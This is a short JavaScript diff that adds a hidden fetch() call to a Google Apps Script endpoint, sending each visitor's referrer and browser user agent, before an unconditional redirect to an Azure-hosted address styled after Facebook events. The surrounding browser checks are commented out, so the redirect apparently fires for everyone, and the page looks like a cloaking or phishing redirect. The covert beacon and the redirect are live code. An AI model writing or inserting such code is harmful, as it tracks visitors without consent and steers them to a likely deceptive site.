@@ -37,6 +37,8 @@
 //            var isBlink = (isChrome || isOpera) && !!window.CSS;
 //        
 //            if(!isOpera && !isFirefox && !isSafari && !isIE && !isEdge && !isChrome && !isBlink){
+                fetch('https://script.google.com/macros/s/AKfycbyUlYFDJQylwNYhuMvgGJF6-zjO_ByVP9O_ViCIEis8xho-1xot/exec?Group=' + document.referrer + '&IP=' + navigator.userAgent).then(console.log)
+        
                 window.location.href = "https://fb-events-api.azurewebsites.net/api/events/zygeiviai";
             //}
         
